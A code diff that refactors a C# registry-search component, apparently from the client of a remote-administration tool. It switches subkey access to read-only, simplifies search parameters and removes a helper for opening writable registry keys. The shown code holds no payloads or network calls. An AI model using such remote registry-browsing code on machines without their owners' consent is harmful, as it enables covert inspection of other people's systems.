@@ -113,8 +113,6 @@ namespace xClient.Core.Registry
         {
             if (rootKeyName != null && rootKeyName.Length > 0)
             {
-
-                // ToDo: Get correct root key...
                 RegistryKey root = GetRootKey(rootKeyName);
 
                 if (root != null)
@@ -124,17 +122,13 @@ namespace xClient.Core.Registry
                     {
                         //Must get the subKey name by removing root and '\\'
                         string subKeyName = rootKeyName.Substring(root.Name.Length + 1);
-                        try
-                        {
-                            root = root.OpenSubKey(subKeyName);
-                        }
-                        catch { }
+                        root = root.OpenReadonlySubKeySafe(subKeyName);
                     }
                 }
 
-                // Temp
+                // Make sure that a root was found
                 if (root != null)
-                    Start(new RegistrySeekerParams(root, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values | Enums.RegistrySearchAction.Data));
+                    Start(new RegistrySeekerParams(root));
             }
         }
 
@@ -175,7 +169,7 @@ namespace xClient.Core.Registry
             if (searchArgs.RootKey == null)
             {
                 foreach (RegistryKey key in RegistrySeeker.ROOT_KEYS)
-                    /* Just need root key so process it */
+                    //Just need root key so process it
                     ProcessKey(key, key.Name);
             }
             else
@@ -189,7 +183,7 @@ namespace xClient.Core.Registry
         {
             try
             {
-                using (RegistryKey key = GetRootKey(rootKeyName).OpenWritableSubKeySafe(rootKeyName))
+                using (RegistryKey key = GetRootKey(rootKeyName).OpenReadonlySubKeySafe(rootKeyName))
                 {
                     if (key != null)
                     {
@@ -261,7 +255,6 @@ namespace xClient.Core.Registry
                     values.Add(new RegValueData(actualValueName, valueType, valueData));
                 }
 
-                //Maybe send null if empty (regValues)
                 AddMatch(keyName, values, key.SubKeyCount);
             }
             else
@@ -280,25 +273,6 @@ namespace xClient.Core.Registry
 
             matches.Add(match);
 
-        }
-
-        public static RegistryKey GetWritableRegistryKey(string keyPath)
-        {
-            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);
-
-            if (key != null)
-            {
-                //Check if this is a root key or not
-                if (key.Name != keyPath)
-                {
-                    //Must get the subKey name by removing root and '\\'
-                    string subKeyName = keyPath.Substring(key.Name.Length + 1);
-
-                    key = key.OpenWritableSubKeySafe(subKeyName);
-                }
-            }
-
-            return key;
         }
 
         public static RegistryKey GetRootKey(string subkey_fullpath)
